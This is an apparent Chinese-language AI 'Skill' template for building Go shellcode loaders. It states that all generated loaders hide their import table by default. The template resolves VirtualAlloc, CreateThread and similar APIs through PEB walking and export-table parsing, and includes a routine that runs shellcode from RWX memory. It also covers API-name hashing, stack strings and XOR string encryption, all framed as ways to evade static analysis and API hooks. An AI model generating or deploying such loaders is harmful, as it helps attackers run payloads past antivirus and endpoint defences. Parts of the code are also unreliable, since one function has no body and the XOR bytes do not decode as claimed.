# API哈希 & IAT隐藏

> **默认行为：本Skill生成的所有Loader默认使用IAT隐藏技术。**

所有敏感API通过PEB Walk和导出表遍历动态获取，不依赖导入表，避免暴露敏感API名称。

---

## 完整Go实现模板

```go
package main

import (
    "golang.org/x/sys/windows"
    "syscall"
    "unsafe"
    "strings"
)

// ==================== PEB结构定义 ====================

type UNICODE_STRING struct {
    Length        uint16
    MaximumLength uint16
    Buffer        uintptr
}

type LIST_ENTRY struct {
    Flink uintptr
    Blink uintptr
}

type PEB_LDR_DATA struct {
    Length                          uint32
    Initialized                     uint32
    SsHandle                        uintptr
    InLoadOrderModuleList           LIST_ENTRY
    InMemoryOrderModuleList         LIST_ENTRY
    InInitializationOrderModuleList LIST_ENTRY
}

type LDR_DATA_TABLE_ENTRY struct {
    InLoadOrderLinks           LIST_ENTRY
    InMemoryOrderLinks         LIST_ENTRY
    InInitializationOrderLinks LIST_ENTRY
    DllBase                    uintptr
    EntryPoint                 uintptr
    SizeOfImage                uintptr
    FullDllName                UNICODE_STRING
    BaseDllName                UNICODE_STRING
}

type PEB struct {
    Reserved1        [2]byte
    BeingDebugged    byte
    Reserved2        [1]byte
    Reserved3        [2]uintptr
    Ldr              uintptr
    ProcessParameters uintptr
}

type IMAGE_DOS_HEADER struct {
    E_magic    uint16
    E_cblp     uint16
    E_cp       uint16
    E_crlc     uint16
    E_cparhdr  uint16
    E_minalloc uint16
    E_maxalloc uint16
    E_ss       uint16
    E_sp       uint16
    E_csum     uint16
    E_ip       uint16
    E_csc      uint16
    E_lfarlc   uint16
    E_ovno     uint16
    E_res      [4]uint16
    E_oemid    uint16
    E_oeminfo  uint16
    E_res2     [10]uint16
    E_lfanew   int32
}

type IMAGE_NT_HEADERS struct {
    Signature      uint32
    FileHeader     IMAGE_FILE_HEADER
    OptionalHeader IMAGE_OPTIONAL_HEADER
}

type IMAGE_FILE_HEADER struct {
    Machine              uint16
    NumberOfSections     uint16
    TimeDateStamp        uint32
    PointerToSymbolTable uint32
    NumberOfSymbols      uint32
    SizeOfOptionalHeader uint16
    Characteristics      uint16
}

type IMAGE_OPTIONAL_HEADER struct {
    Magic                       uint16
    MajorLinkerVersion          byte
    MinorLinkerVersion          byte
    SizeOfCode                  uint32
    SizeOfInitializedData       uint32
    SizeOfUninitializedData     uint32
    AddressOfEntryPoint         uint32
    BaseOfCode                  uint32
    ImageBase                   uintptr
    SectionAlignment            uint32
    FileAlignment               uint32
    MajorOperatingSystemVersion uint16
    MinorOperatingSystemVersion uint16
    MajorImageVersion           uint16
    MinorImageVersion           uint16
    MajorSubsystemVersion       uint16
    MinorSubsystemVersion       uint16
    Win32VersionValue           uint32
    SizeOfImage                 uint32
    SizeOfHeaders               uint32
    CheckSum                    uint32
    Subsystem                   uint16
    DllCharacteristics          uint16
    SizeOfStackReserve          uintptr
    SizeOfStackCommit           uintptr
    SizeOfHeapReserve           uintptr
    SizeOfHeapCommit            uintptr
    LoaderFlags                 uint32
    NumberOfRvaAndSizes         uint32
    DataDirectory               [16]IMAGE_DATA_DIRECTORY
}

type IMAGE_DATA_DIRECTORY struct {
    VirtualAddress uint32
    Size           uint32
}

type IMAGE_EXPORT_DIRECTORY struct {
    Characteristics       uint32
    TimeDateStamp         uint32
    MajorVersion          uint16
    MinorVersion          uint16
    Name                  uint32
    Base                  uint32
    NumberOfFunctions     uint32
    NumberOfNames         uint32
    AddressOfFunctions    uint32
    AddressOfNames        uint32
    AddressOfNameOrdinals uint32
}

// ==================== PEB Walk获取模块基址 ====================

func getModuleHandle(moduleName string) uintptr {
    // 获取PEB地址 (x64: GS:[0x60])
    pebAddr := getPebAddress()
    peb := (*PEB)(unsafe.Pointer(pebAddr))
    
    // 获取Ldr
    ldr := (*PEB_LDR_DATA)(unsafe.Pointer(peb.Ldr))
    
    // 遍历InLoadOrderModuleList
    head := ldr.InLoadOrderModuleList.Flink
    current := (*LDR_DATA_TABLE_ENTRY)(unsafe.Pointer(head))
    
    for uintptr(unsafe.Pointer(current)) != uintptr(unsafe.Pointer(&ldr.InLoadOrderModuleList)) {
        // 获取模块名称
        name := readUnicodeString(&current.BaseDllName)
        
        // 比较名称（忽略大小写）
        if compareStringsIgnoreCase(name, moduleName) {
            return current.DllBase
        }
        
        // 下一个模块
        current = (*LDR_DATA_TABLE_ENTRY)(unsafe.Pointer(current.InLoadOrderLinks.Flink))
    }
    
    return 0
}

func getPebAddress() uintptr {
    // 在Go中，可以通过以下方式获取PEB地址：
    // 方法1: 使用NtQueryInformationProcess
    // 方法2: 使用windows.CurrentProcess() + ReadProcessMemory

    ntdll := windows.NewLazySystemDLL("ntdll.dll")
    NtQueryInformationProcess := ntdll.NewProc("NtQueryInformationProcess")

    var pbi PROCESS_BASIC_INFORMATION
    var returnLength uint32

    NtQueryInformationProcess.Call(
        uintptr(windows.CurrentProcess()),
        0, // ProcessBasicInformation
        uintptr(unsafe.Pointer(&pbi)),
        uintptr(unsafe.Sizeof(pbi)),
        uintptr(unsafe.Pointer(&returnLength)))

    return uintptr(pbi.PebBaseAddress)
}

type PROCESS_BASIC_INFORMATION struct {
    ExitStatus       uintptr
    PebBaseAddress   uintptr
    AffinityMask     uintptr
    BasePriority     uintptr
    UniqueProcessId  uintptr
    InheritedFromPid uintptr
}

// 或者使用更简单的方式：windows模块内部已提供PEB访问
func getPebAddressSimple() uintptr {
    // 使用TEB/PEB链
    // 在x64上，GS:[0x30]是TEB，GS:[0x60]是PEB
    // Go不直接支持汇编，使用NtQueryInformationProcess是推荐方式

    return getPebAddress()
}

func readUnicodeString(us *UNICODE_STRING) string {
    if us.Buffer == 0 || us.Length == 0 {
        return ""
    }

    // 读取UTF-16字符串并转换为UTF-8
    buf := make([]uint16, us.Length/2)
    for i := 0; i < int(us.Length/2); i++ {
        buf[i] = *(*uint16)(unsafe.Pointer(us.Buffer + uintptr(i*2)))
    }

    return utf16ToString(buf)
}

func utf16ToString(buf []uint16) string {
    // 简单的UTF-16转UTF-8
    result := make([]byte, 0, len(buf))
    for _, u := range buf {
        if u < 0x80 {
            result = append(result, byte(u))
        } else if u < 0x800 {
            result = append(result, byte(0xC0|(u>>6)), byte(0x80|(u&0x3F)))
        } else {
            result = append(result, byte(0xE0|(u>>12)), byte(0x80|((u>>6)&0x3F)), byte(0x80|(u&0x3F)))
        }
    }
    return string(result)
}

func compareStringsIgnoreCase(s1, s2 string) bool {
    return strings.EqualFold(s1, s2)
}

// ==================== 导出表遍历获取API地址 ====================

func getProcAddress(moduleBase uintptr, procName string) uintptr {
    // 解析DOS头
    dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(moduleBase))
    if dosHeader.E_magic != 0x5A4D { // "MZ"
        return 0
    }
    
    // 解析NT头
    ntHeader := (*IMAGE_NT_HEADERS)(unsafe.Pointer(moduleBase + uintptr(dosHeader.E_lfanew)))
    
    // 获取导出表RVA
    exportRVA := ntHeader.OptionalHeader.DataDirectory[0].VirtualAddress
    if exportRVA == 0 {
        return 0
    }
    
    exportDir := (*IMAGE_EXPORT_DIRECTORY)(unsafe.Pointer(moduleBase + uintptr(exportRVA)))
    
    // 遍历名称表
    namesAddr := moduleBase + uintptr(exportDir.AddressOfNames)
    ordinalsAddr := moduleBase + uintptr(exportDir.AddressOfNameOrdinals)
    functionsAddr := moduleBase + uintptr(exportDir.AddressOfFunctions)
    
    for i := uint32(0); i < exportDir.NumberOfNames; i++ {
        // 获取名称RVA
        nameRVA := *(*uint32)(unsafe.Pointer(namesAddr + uintptr(i*4)))
        name := readCString(moduleBase + uintptr(nameRVA))
        
        // 比较名称
        if name == procName {
            // 获取序号
            ordinal := *(*uint16)(unsafe.Pointer(ordinalsAddr + uintptr(i*2)))
            // 获取函数地址RVA
            funcRVA := *(*uint32)(unsafe.Pointer(functionsAddr + uintptr(ordinal*4)))
            return moduleBase + uintptr(funcRVA)
        }
    }
    
    return 0
}

func readCString(addr uintptr) string {
    var result []byte
    for {
        c := *(*byte)(unsafe.Pointer(addr))
        if c == 0 {
            break
        }
        result = append(result, c)
        addr++
    }
    return string(result)
}

// ==================== API哈希获取 ====================

func getProcAddressByHash(moduleBase uintptr, hash uint32) uintptr {
    // 遍历导出表，计算每个API名称的哈希并比对
    // ...
}

func djb2Hash(s string) uint32 {
    var hash uint32 = 5381
    for _, c := range s {
        hash = ((hash << 5) + hash) + uint32(c)
    }
    return hash
}

// ==================== 初始化所有敏感API ====================

var (
    pVirtualAlloc       uintptr
    pVirtualProtect     uintptr
    pCreateThread       uintptr
    pRtlMoveMemory      uintptr
    pWaitForSingleObject uintptr
)

func initAPIs() {
    kernel32Base := getModuleHandle("kernel32.dll")
    
    pVirtualAlloc = getProcAddress(kernel32Base, "VirtualAlloc")
    pVirtualProtect = getProcAddress(kernel32Base, "VirtualProtect")
    pCreateThread = getProcAddress(kernel32Base, "CreateThread")
    pRtlMoveMemory = getProcAddress(kernel32Base, "RtlMoveMemory")
    pWaitForSingleObject = getProcAddress(kernel32Base, "WaitForSingleObject")
}

// ==================== 使用动态获取的API ====================

func virtualAlloc(size uintptr) uintptr {
    ret, _, _ := syscall.SyscallN(pVirtualAlloc, 0, size, 0x1000|0x2000, 0x40)
    return ret
}

func executeShellcode(sc []byte) {
    initAPIs()
    
    // 分配内存
    addr := virtualAlloc(uintptr(len(sc)))
    
    // 复制shellcode
    syscall.SyscallN(pRtlMoveMemory, addr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
    
    // 创建线程
    thread, _, _ := syscall.SyscallN(pCreateThread, 0, 0, addr, 0, 0, 0)
    
    // 等待
    syscall.SyscallN(pWaitForSingleObject, thread, 0xFFFFFFFF)
}
```

---

**原理：**
- 遍历PEB结构获取已加载模块
- 不使用GetModuleHandle，避免API Hook
- 直接从PEB的InLoadOrderModuleList获取模块信息

**PEB结构：**
```go
type PEB struct {
    Reserved1        [2]byte
    BeingDebugged    byte
    Reserved2        [1]byte
    Reserved3        [2]uintptr
    Ldr              uintptr
    ProcessParameters uintptr
    // ...
}

type PEB_LDR_DATA struct {
    Length               uint32
    Initialized          uint32
    SsHandle             uintptr
    InLoadOrderModuleList LIST_ENTRY
    InMemoryOrderModuleList LIST_ENTRY
    InInitializationOrderModuleList LIST_ENTRY
}

type LIST_ENTRY struct {
    Flink uintptr
    Blink uintptr
}

type LDR_DATA_TABLE_ENTRY struct {
    InLoadOrderLinks           LIST_ENTRY
    InMemoryOrderLinks         LIST_ENTRY
    InInitializationOrderLinks LIST_ENTRY
    DllBase                    uintptr
    EntryPoint                 uintptr
    SizeOfImage                uintptr
    FullDllName                UNICODE_STRING
    BaseDllName                UNICODE_STRING
}
```

**Go实现：**
```go
func getModuleHandleByPEB(moduleName string) uintptr {
    // 获取PEB地址
    peb := getPEB()
    
    // 遍历InLoadOrderModuleList
    ldr := (*PEB_LDR_DATA)(unsafe.Pointer(peb.Ldr))
    current := (*LDR_DATA_TABLE_ENTRY)(unsafe.Pointer(ldr.InLoadOrderModuleList.Flink))
    
    for {
        // 比较模块名称
        name := unicodeToString(&current.BaseDllName)
        if strings.EqualFold(name, moduleName) {
            return current.DllBase
        }
        
        // 下一个模块
        next := current.InLoadOrderLinks.Flink
        if next == uintptr(unsafe.Pointer(&ldr.InLoadOrderModuleList)) {
            break // 遍历完成
        }
        current = (*LDR_DATA_TABLE_ENTRY)(unsafe.Pointer(next))
    }
    
    return 0
}

func getPEB() *PEB {
    // Go不直接支持内联汇编
    // 使用NtQueryInformationProcess获取PEB地址
    ntdll := windows.NewLazySystemDLL("ntdll.dll")
    NtQueryInformationProcess := ntdll.NewProc("NtQueryInformationProcess")

    var pbi PROCESS_BASIC_INFORMATION
    var returnLength uint32

    NtQueryInformationProcess.Call(
        uintptr(windows.CurrentProcess()),
        0, // ProcessBasicInformation
        uintptr(unsafe.Pointer(&pbi)),
        uintptr(unsafe.Sizeof(pbi)),
        uintptr(unsafe.Pointer(&returnLength)))

    return (*PEB)(unsafe.Pointer(pbi.PebBaseAddress))
}
```

---

## 2. 导出表遍历实现

**原理：**
- 解析PE导出表获取API地址
- 不使用GetProcAddress，避免API Hook
- 通过IMAGE_EXPORT_DIRECTORY查找函数

**导出表结构：**
```go
type IMAGE_EXPORT_DIRECTORY struct {
    Characteristics       uint32
    TimeDateStamp         uint32
    MajorVersion          uint16
    MinorVersion          uint16
    Name                  uint32
    Base                  uint32
    NumberOfFunctions     uint32
    NumberOfNames         uint32
    AddressOfFunctions    uint32 // RVA
    AddressOfNames        uint32 // RVA
    AddressOfNameOrdinals uint32 // RVA
}
```

**Go实现：**
```go
func getProcAddressByExport(moduleBase uintptr, procName string) uintptr {
    // 解析PE头
    dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(moduleBase))
    ntHeader := (*IMAGE_NT_HEADERS)(unsafe.Pointer(moduleBase + uintptr(dosHeader.E_lfanew)))
    
    // 获取导出表RVA
    exportDirRVA := ntHeader.OptionalHeader.DataDirectory[0].VirtualAddress
    if exportDirRVA == 0 {
        return 0
    }
    
    exportDir := (*IMAGE_EXPORT_DIRECTORY)(unsafe.Pointer(moduleBase + uintptr(exportDirRVA)))
    
    // 遍历名称表
    namesRVA := exportDir.AddressOfNames
    ordinalsRVA := exportDir.AddressOfNameOrdinals
    functionsRVA := exportDir.AddressOfFunctions
    
    nameCount := exportDir.NumberOfNames
    base := exportDir.Base
    
    for i := uint32(0); i < nameCount; i++ {
        // 获取名称RVA
        nameAddr := *(*uint32)(unsafe.Pointer(moduleBase + uintptr(namesRVA) + uintptr(i*4)))
        name := cStringToString(moduleBase + uintptr(nameAddr))
        
        if name == procName {
            // 获取序号
            ordinal := *(*uint16)(unsafe.Pointer(moduleBase + uintptr(ordinalsRVA) + uintptr(i*2)))
            // 获取函数地址
            funcRVA := *(*uint32)(unsafe.Pointer(moduleBase + uintptr(functionsRVA) + uintptr(ordinal*4)))
            return moduleBase + uintptr(funcRVA)
        }
    }
    
    return 0
}
```

---

## 3. API哈希

### Djb2哈希

**原理：**
- 简单高效的哈希算法
- hash = hash * 33 + c

**Go实现：**
```go
func djb2Hash(s string) uint32 {
    var hash uint32 = 5381
    for _, c := range s {
        hash = ((hash << 5) + hash) + uint32(c) // hash * 33 + c
    }
    return hash
}

// 使用哈希查找API
func getProcAddressByHash(moduleBase uintptr, hash uint32) uintptr {
    // 遍历导出表，计算每个API名称的哈希
    // 找到匹配的哈希值返回地址
}
```

### CRC32哈希

**Go实现：**
```go
func crc32Hash(s string) uint32 {
    const poly uint32 = 0xEDB88320
    var crc uint32 = 0xFFFFFFFF
    
    for _, c := range s {
        crc ^= uint32(c)
        for i := 0; i < 8; i++ {
            if crc&1 != 0 {
                crc = (crc >> 1) ^ poly
            } else {
                crc >>= 1
            }
        }
    }
    
    return crc ^ 0xFFFFFFFF
}
```

### Jenkins哈希

**Go实现：**
```go
func jenkinsHash(s string) uint32 {
    var hash uint32 = 0
    for _, c := range s {
        hash += uint32(c)
        hash += hash << 10
        hash ^= hash >> 6
    }
    hash += hash << 3
    hash ^= hash >> 11
    hash += hash << 15
    return hash
}
```

---

## 4. 字符串隐藏

### 栈字符串

**原理：**
- 在栈上逐字符构建字符串
- 避免静态分析发现敏感字符串

**Go实现：**
```go
func buildStackString() string {
    // 在栈上构建 "kernel32.dll"
    var s [12]byte
    s[0] = 'k'
    s[1] = 'e'
    s[2] = 'r'
    s[3] = 'n'
    s[4] = 'e'
    s[5] = 'l'
    s[6] = '3'
    s[7] = '2'
    s[8] = '.'
    s[9] = 'd'
    s[10] = 'l'
    s[11] = 'l'
    return string(s[:])
}
```

### XOR字符串

**原理：**
- 运行时解密加密的字符串
- 防止静态分析发现API名称

**Go实现：**
```go
// 编译时加密的字符串
var encKernel32 = []byte{0x1b, 0x06, 0x12, 0x0c, 0x06, 0x13, 0x23, 0x22, 0x5d, 0x08, 0x13, 0x13}
var xorKey byte = 0x6e // 'n'

func decryptXORString(enc []byte, key byte) string {
    dec := make([]byte, len(enc))
    for i := range enc {
        dec[i] = enc[i] ^ key
    }
    return string(dec)
}

// 运行时解密获取 "kernel32.dll"
func getKernel32Name() string {
    return decryptXORString(encKernel32, xorKey)
}
```

---

## 5. IAT伪装

**原理：**
- 伪造导入表，添加无害API
- 隐藏真实敏感API导入
- 避免静态分析发现敏感特征

**Go实现：**
```go
// 使用延迟绑定，不显式导入敏感API
// 通过PEB Walk动态获取API地址
func initAPIs() {
    kernel32Base := getModuleHandleByPEB("kernel32.dll")
    ntdllBase := getModuleHandleByPEB("ntdll.dll")
    
    // 通过导出表获取API地址
    VirtualAllocAddr = getProcAddressByExport(kernel32Base, "VirtualAlloc")
    NtAllocateVirtualMemoryAddr = getProcAddressByExport(ntdllBase, "NtAllocateVirtualMemory")
    // ...
}
```

---

## 注意事项

1. **编译期哈希**：可在编译时计算API哈希，避免运行时字符串暴露
2. **动态解析**：所有API通过PEB Walk动态获取，不依赖导入表
3. **大小写敏感**：Windows API名称比较需要忽略大小写
4. **转发函数**：注意处理导出表中的转发函数（名称以DLL名开头）